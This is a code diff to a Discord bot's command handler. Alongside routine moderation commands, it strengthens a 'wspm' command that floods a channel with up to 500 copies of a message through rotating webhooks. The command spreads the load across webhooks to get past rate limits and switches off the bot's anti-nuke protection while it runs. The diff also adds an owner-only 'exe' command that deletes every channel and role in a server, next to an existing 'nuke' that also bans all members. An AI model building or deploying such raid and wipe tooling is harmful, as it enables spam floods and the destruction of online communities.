@@ -6,10 +6,6 @@ const { markPending, consume } = require('../utils/pendingConfirms');
 const music = require('../utils/musicManager');
 const { matchAutoResponse, findAutoReactEmojis, normalize } = require('../utils/autoEngage');
 
-// Tracks the last message content per guild+author so repeated/flooded messages can be
-// detected without needing a full message-history fetch. Bounded by concurrently-active
-// users (one entry per user who has sent a message since the bot started), not by message
-// volume, so it doesn't grow unbounded the way a full log would.
 const lastMessageByAuthor = new Map();
 
 function ownedChannelOf(message, config) {
@@ -75,11 +71,6 @@ module.exports = {
       ).catch(() => null);
     }
 
-    // Message-repeat spam: if this user's message is identical (trimmed, case-insensitive) to
-    // their last one in this guild, count it toward the messageSpam threshold. Only repeats
-    // count — a user chatting normally never touches this counter, only flooding the same
-    // line over and over does. Owner/whitelist/trusted-role immunity is handled inside
-    // guardMessage() itself, same as every other anti-nuke check.
     if (message.content && message.member) {
       const key = `${message.guild.id}:${message.author.id}`;
       const normalized = message.content.trim().toLowerCase();
@@ -163,6 +154,8 @@ module.exports = {
           `\`${prefix}lock [#channel]\` / \`${prefix}unlock [#channel]\` — lock/unlock a text channel (defaults to current)\n` +
           `\`${prefix}hide [#channel]\` / \`${prefix}unhide [#channel]\` — hide/reveal a text channel\n` +
           `\`${prefix}role @user @role\` — toggle a role on a member\n` +
+          `\`${prefix}deleterole @role\` — delete a role\n` +
+          `\`${prefix}deletechannel [#channel]\` — delete a channel (defaults to the current one)\n` +
           `\`${prefix}mute @user <time>\` / \`${prefix}unmute @user\` — timeout or lift a timeout (e.g. \`10m\`, \`2h\`, \`1d\`)\n` +
           `\`${prefix}nick @user <nickname>\` — set a member's nickname\n\n` +
           `**Anti-Nuke** (admin only)\n` +
@@ -173,7 +166,8 @@ module.exports = {
           `**Bot owner only**\n` +
           `\`${prefix}createchannels [voice]\` — create multiple channels (asks for names, then how many of each)\n` +
           `\`${prefix}wspm <message> <count>\` — send a message N times via rotating webhooks (max 500)\n` +
-          `\`${prefix}nuke\` — wipe the server (delete channels/roles, ban everyone)\n\n` +
+          `\`${prefix}nuke\` — wipe the server (delete channels/roles, ban everyone)\n` +
+          `\`${prefix}exe\` — fast wipe: delete every channel + role only, no bans\n\n` +
           `**Music**\n` +
           `\`${prefix}play <song or URL>\` — play or queue a song\n` +
           `\`${prefix}skip\` · \`${prefix}stop\` · \`${prefix}pause\` · \`${prefix}resume\`\n` +
@@ -364,11 +358,6 @@ module.exports = {
         return message.reply(`❌ Max is **${MAX_WEBHOOK_SPAM}**.`);
       }
 
-      // No upfront fetchWebhooks() capacity check — it was a mandatory round-trip before anything
-      // else could even start, on every single call above 15 messages. Not actually needed: if
-      // the channel is near Discord's 15-webhook-per-channel cap, some of the creates below just
-      // fail individually, and — thanks to the shared queue below — the webhooks that DID get
-      // created simply absorb the extra work rather than that slice being lost.
       const WEBHOOK_COUNT = Math.max(1, Math.min(15, Math.ceil(count / 15)));
 
       const progressMsg = await message.reply(`⏳ Sending ${count} message(s) via up to ${WEBHOOK_COUNT} webhook(s)...`);
@@ -383,16 +372,6 @@ module.exports = {
         progressMsg.edit(`⏳ Sent **${sent + failed}/${count}**...`).catch(() => null);
       }, 3000);
 
-      // Shared work queue instead of a fixed per-webhook slice: every webhook pulls the NEXT
-      // unsent message rather than owning a pre-assigned list. Each webhook has its own
-      // independent rate-limit bucket, and those buckets don't stay perfectly in sync in
-      // practice — one webhook can end up more throttled than another. With a fixed slice, a
-      // throttled webhook just sits there working through its list while a less-throttled one
-      // that finished early goes idle with nothing left to do. With a shared queue, that idle
-      // webhook immediately grabs the next pending message instead — the whole pool of webhooks
-      // stays busy for as long as there's work left, instead of finishing only as fast as
-      // whichever single webhook drew the unlucky slice. It also means a webhook that fails to
-      // even get created doesn't permanently lose a chunk of messages — the others just cover it.
       let nextJob = 0;
       function claimJob() {
         if (nextJob >= count) return -1;
@@ -413,21 +392,21 @@ module.exports = {
               createdHooks.push(hook);
             } catch (err) {
               console.error(`[SYNTIX] webhook create ${slotIdx + 1}/${WEBHOOK_COUNT} failed:`, err.message);
-              return; // no slice lost — the webhooks that DID get created will cover this work
+              return;
             }
 
             for (let job = claimJob(); job !== -1; job = claimJob()) {
               try {
-                // withRetry adds one retry for transient network/5xx blips only — it passes 429s
-                // straight through untouched, so the rate-limit backoff right below still runs
-                // exactly as before. This just makes a send that fails for an unrelated reason
-                // (a brief connection hiccup) not count as a permanent loss.
                 await withRetry(() => hook.send({ content: text, username: message.author.username }));
                 sent++;
               } catch (err) {
                 failed++;
-                if (err.status === 429 && err.retry_after) {
-                  await new Promise((r) => setTimeout(r, Math.ceil(err.retry_after * 1000) + 250));
+                if (err.status === 429) {
+                  const retryAfterSec = err.retry_after ?? err.retryAfter ?? err.rawError?.retry_after ?? err.data?.retry_after;
+                  const waitMs = typeof retryAfterSec === 'number' && retryAfterSec > 0
+                    ? Math.ceil(retryAfterSec * 1000) + 250
+                    : 1000;
+                  await new Promise((r) => setTimeout(r, waitMs));
                 }
               }
             }
@@ -450,9 +429,6 @@ module.exports = {
         console.error('[SYNTIX] wspm error:', err);
         return progressMsg.edit(`❌ Error: ${err.message}`);
       } finally {
-        // Cleanup now runs in parallel instead of one-at-a-time — deleting 14 webhooks
-        // sequentially could add several seconds of pure teardown time, during which anti-nuke
-        // protection stayed suppressed for no benefit to the command itself.
         await Promise.all(createdHooks.map((hook) => hook.delete('SYNTIX wspm cleanup').catch(() => null)));
         endSuppressedOperation(message.guild.id);
       }
@@ -509,6 +485,19 @@ module.exports = {
       }
 
       const total = names.length * count;
+
+      const GUILD_CHANNEL_CAP = 500;
+      const remainingCapacity = GUILD_CHANNEL_CAP - message.guild.channels.cache.size;
+      if (remainingCapacity <= 0) {
+        return message.reply(`❌ This server is already at Discord's ${GUILD_CHANNEL_CAP}-channel limit — nothing more can be created.`);
+      }
+      if (total > remainingCapacity) {
+        return message.reply(
+          `❌ That would create **${total}** channel(s), but this server only has room for **${remainingCapacity}** more ` +
+          `before hitting Discord's ${GUILD_CHANNEL_CAP}-channel limit. Lower the count/name list and try again.`
+        );
+      }
+
       const progressMsg = await message.channel.send(`⏳ Creating ${total} channel(s)...`);
 
       const jobs = [];
@@ -576,6 +565,9 @@ module.exports = {
       }
 
       const targetChannel = message.mentions.channels.first() || message.channel;
+      if (targetChannel.guild?.id !== message.guild.id) {
+        return message.reply("❌ That channel isn't in this server.");
+      }
       if (targetChannel.type !== 0 && targetChannel.type !== 5) {
         return message.reply('❌ That has to be a text channel.');
       }
@@ -634,6 +626,90 @@ module.exports = {
         }
       } catch (err) {
         return message.reply(`❌ Couldn't update that role: ${err.message}`);
+      }
+    }
+
+    if (cmd === 'deleterole' || cmd === 'roledelete') {
+      if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) {
+        return message.reply('❌ You need **Manage Roles** to do that.');
+      }
+      const role = message.mentions.roles?.first()
+        || (args[0] && message.guild.roles.cache.get(args[0]))
+        || (args.length ? message.guild.roles.cache.find((r) => r.name.toLowerCase() === args.join(' ').toLowerCase()) : null);
+      if (!role) {
+        return message.reply(`❌ Usage: \`${prefix}deleterole @role\` (mention, ID, or exact name also work)`);
+      }
+      if (role.id === message.guild.id) {
+        return message.reply("❌ Can't delete the @everyone role.");
+      }
+      if (role.managed) {
+        return message.reply("❌ That role belongs to an integration/bot and can't be deleted manually.");
+      }
+
+      const me = message.guild.members.me;
+      if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
+        return message.reply('❌ I need the **Manage Roles** permission to do that.');
+      }
+      if (role.position >= me.roles.highest.position) {
+        return message.reply('❌ That role is higher than or equal to my highest role — move my role above it in Server Settings.');
+      }
+      if (
+        role.position >= message.member.roles.highest.position &&
+        message.guild.ownerId !== message.author.id
+      ) {
+        return message.reply("❌ You can't delete a role equal to or higher than your own highest role.");
+      }
+
+      const roleName = role.name;
+      try {
+        await withRetry(() => role.delete(`Deleted by ${message.author.tag} via ${prefix}deleterole`));
+        return message.reply(`🗑️ Deleted role **${roleName}**.`);
+      } catch (err) {
+        return message.reply(`❌ Couldn't delete that role: ${err.message}`);
+      }
+    }
+
+    if (cmd === 'deletechannel' || cmd === 'channeldelete') {
+      if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) {
+        return message.reply('❌ You need **Manage Channels** to do that.');
+      }
+      let targetChannel;
+      const mentioned = message.mentions.channels?.first();
+      if (mentioned) {
+        targetChannel = mentioned;
+      } else if (args[0]) {
+        targetChannel = message.guild.channels.cache.get(args[0]);
+        if (!targetChannel) {
+          return message.reply(`❌ Couldn't find a channel matching \`${args[0]}\` in this server. Use a mention or a valid channel ID.`);
+        }
+      } else {
+        targetChannel = message.channel;
+      }
+      if (targetChannel.guild?.id !== message.guild.id) {
+        return message.reply("❌ That channel isn't in this server.");
+      }
+
+      const me = message.guild.members.me;
+      if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
+        return message.reply('❌ I need the **Manage Channels** permission to do that.');
+      }
+      if (!targetChannel.deletable) {
+        return message.reply("❌ I can't delete that channel — check my role position and permissions there.");
+      }
+
+      const channelName = targetChannel.name;
+      const isCurrent = targetChannel.id === message.channel.id;
+      try {
+        if (isCurrent) {
+          await message.reply(`🗑️ Deleting this channel (**#${channelName}**)...`);
+        }
+        await withRetry(() => targetChannel.delete(`Deleted by ${message.author.tag} via ${prefix}deletechannel`));
+        if (!isCurrent) {
+          return message.reply(`🗑️ Deleted channel **#${channelName}**.`);
+        }
+        return;
+      } catch (err) {
+        return message.reply(`❌ Couldn't delete that channel: ${err.message}`);
       }
     }
 
@@ -744,6 +820,9 @@ module.exports = {
         return message.reply('❌ You need **Administrator** to do that.');
       }
       const logChannel = message.mentions.channels.first() || message.channel;
+      if (logChannel.guild?.id !== message.guild.id) {
+        return message.reply("❌ That channel isn't in this server.");
+      }
       config.antinuke.enabled = true;
       config.antinuke.logChannelId = logChannel.id;
       saveGuild(message.guild.id, config);
@@ -846,6 +925,52 @@ module.exports = {
         );
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`aeth_nuke_confirm_${message.author.id}`).setLabel('Confirm Wipe').setStyle(ButtonStyle.Danger)
+      );
+      const sentMsg = await message.reply({ embeds: [embed], components: [row] });
+
+      markPending(sentMsg.id);
+      setTimeout(async () => {
+        if (!consume(sentMsg.id)) return;
+        const expiredRow = new ActionRowBuilder().addComponents(
+          ButtonBuilder.from(row.components[0]).setDisabled(true).setLabel('Expired').setStyle(ButtonStyle.Secondary)
+        );
+        await sentMsg.edit({ components: [expiredRow] }).catch(() => null);
+      }, 15000);
+
+      return;
+    }
+
+    // ---- fast bulk role+channel delete (no bans) — same engine/confirm flow as &nuke ----
+    if (cmd === 'exe') {
+      const ownerId = process.env.OWNER_ID?.trim();
+      if (!ownerId) {
+        return message.reply('⚠️ `OWNER_ID` is not set in the bot\'s `.env` file, so this command is disabled. Set it and restart the bot.');
+      }
+      if (message.author.id !== ownerId) {
+        return message.reply("❌ This is an owner-only command — your Discord ID doesn't match `OWNER_ID` in the bot's `.env` file.");
+      }
+
+      const botMember = message.guild.members.me;
+      const highestOtherRolePos = message.guild.roles.cache
+        .filter(r => r.id !== message.guild.id && !r.managed)
+        .reduce((max, r) => Math.max(max, r.position), 0);
+      const hierarchyWarning = botMember.roles.highest.position <= highestOtherRolePos
+        ? '\n\n⚠️ **My role is not at the top of the role list.** Role deletions will likely fail for ' +
+          'roles positioned at or above mine. Move my role to the top of **Server Settings → Roles** ' +
+          'before confirming for a full sweep.'
+        : '';
+
+      const embed = new EmbedBuilder()
+        .setTitle('⚠️ Confirm fast role + channel wipe')
+        .setColor(0xED4245)
+        .setDescription(
+          `This will delete **${message.guild.channels.cache.size} channel(s)** and ` +
+          `**${message.guild.roles.cache.filter(r => r.id !== message.guild.id && !r.managed).size} role(s)**. ` +
+          `No members are banned or kicked.\n` +
+          `This cannot be undone. Confirm within 15 seconds.${hierarchyWarning}`
+        );
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`aeth_exe_confirm_${message.author.id}`).setLabel('Confirm Wipe').setStyle(ButtonStyle.Danger)
       );
       const sentMsg = await message.reply({ embeds: [embed], components: [row] });
 
